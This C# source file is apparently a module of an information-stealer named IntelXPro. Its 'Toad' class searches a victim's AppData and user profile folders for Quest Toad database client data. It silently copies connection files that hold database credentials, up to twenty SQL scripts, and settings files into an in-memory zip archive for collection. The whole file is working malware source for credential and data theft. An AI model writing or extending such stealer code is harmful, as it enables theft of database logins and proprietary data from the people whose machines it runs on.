using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class Toad : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Quest Software");
            string userProfilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Quest Software");

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "Toad";

            bool foundData = false;

            if (Directory.Exists(appDataPath))
            {
                foundData |= CollectFromQuestDirectory(appDataPath, "AppData", zip, counterApplications);
            }

            if (Directory.Exists(userProfilePath))
            {
                foundData |= CollectFromQuestDirectory(userProfilePath, "UserProfile", zip, counterApplications);
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private bool CollectFromQuestDirectory(string basePath, string location, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string[] toadDirs = Directory.GetDirectories(basePath, "Toad*", SearchOption.TopDirectoryOnly);

                foreach (string toadDir in toadDirs)
                {
                    string toadProduct = Path.GetFileName(toadDir);
                    
                    foundData |= CollectConnections(toadDir, location, toadProduct, zip, counterApplications);
                    foundData |= CollectUserFiles(toadDir, location, toadProduct, zip, counterApplications);
                    foundData |= CollectSettings(toadDir, location, toadProduct, zip, counterApplications);
                }
            }
            catch
            {
            }

            return foundData;
        }

        private bool CollectConnections(string toadDir, string location, string toadProduct, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string[] versionDirs = Directory.GetDirectories(toadDir, "*.*", SearchOption.TopDirectoryOnly);

                foreach (string versionDir in versionDirs)
                {
                    string versionName = Path.GetFileName(versionDir);
                    
                    string[] connectionFiles = new string[]
                    {
                        "Connections.ini",
                        "ConnectionManager.dat",
                        "CONNECTIONS.XML"
                    };

                    foreach (string connectionFile in connectionFiles)
                    {
                        string fullPath = Path.Combine(versionDir, connectionFile);
                        if (File.Exists(fullPath))
                        {
                            string zipPath = $"Applications\\Toad\\{location}\\{toadProduct}\\{versionName}\\{connectionFile}";
                            zip.AddFile(zipPath, File.ReadAllBytes(fullPath));
                            counterApplications.Files.Add(fullPath + " => " + zipPath);
                            foundData = true;
                        }
                    }

                    string userFilesPath = Path.Combine(versionDir, "User Files");
                    if (Directory.Exists(userFilesPath))
                    {
                        string connectionsIni = Path.Combine(userFilesPath, "Connections.ini");
                        if (File.Exists(connectionsIni))
                        {
                            string zipPath = $"Applications\\Toad\\{location}\\{toadProduct}\\{versionName}\\User Files\\Connections.ini";
                            zip.AddFile(zipPath, File.ReadAllBytes(connectionsIni));
                            counterApplications.Files.Add(connectionsIni + " => " + zipPath);
                            foundData = true;
                        }
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }

        private bool CollectUserFiles(string toadDir, string location, string toadProduct, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string[] versionDirs = Directory.GetDirectories(toadDir, "*.*", SearchOption.TopDirectoryOnly);

                foreach (string versionDir in versionDirs)
                {
                    string versionName = Path.GetFileName(versionDir);
                    
                    string userFilesPath = Path.Combine(versionDir, "User Files");
                    if (Directory.Exists(userFilesPath))
                    {
                        string[] sqlFiles = Directory.GetFiles(userFilesPath, "*.sql", SearchOption.TopDirectoryOnly);
                        
                        foreach (string file in sqlFiles.Take(20))
                        {
                            string fileName = Path.GetFileName(file);
                            string zipPath = $"Applications\\Toad\\{location}\\{toadProduct}\\{versionName}\\User Files\\{fileName}";
                            zip.AddFile(zipPath, File.ReadAllBytes(file));
                            counterApplications.Files.Add(file + " => " + zipPath);
                            foundData = true;
                        }
                    }

                    string scriptsPath = Path.Combine(versionDir, "Scripts");
                    if (Directory.Exists(scriptsPath))
                    {
                        string[] scriptFiles = Directory.GetFiles(scriptsPath, "*.sql", SearchOption.AllDirectories);
                        
                        foreach (string file in scriptFiles.Take(20))
                        {
                            string relativePath = file.Substring(scriptsPath.Length + 1);
                            string zipPath = $"Applications\\Toad\\{location}\\{toadProduct}\\{versionName}\\Scripts\\{relativePath}";
                            zip.AddFile(zipPath, File.ReadAllBytes(file));
                            counterApplications.Files.Add(file + " => " + zipPath);
                            foundData = true;
                        }
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }

        private bool CollectSettings(string toadDir, string location, string toadProduct, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string[] versionDirs = Directory.GetDirectories(toadDir, "*.*", SearchOption.TopDirectoryOnly);

                foreach (string versionDir in versionDirs)
                {
                    string versionName = Path.GetFileName(versionDir);
                    
                    string[] settingsFiles = new string[]
                    {
                        "Toad.ini",
                        "User.ini",
                        "Options.xml"
                    };

                    foreach (string settingsFile in settingsFiles)
                    {
                        string fullPath = Path.Combine(versionDir, settingsFile);
                        if (File.Exists(fullPath))
                        {
                            string zipPath = $"Applications\\Toad\\{location}\\{toadProduct}\\{versionName}\\{settingsFile}";
                            zip.AddFile(zipPath, File.ReadAllBytes(fullPath));
                            counterApplications.Files.Add(fullPath + " => " + zipPath);
                            foundData = true;
                        }
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }
    }
}
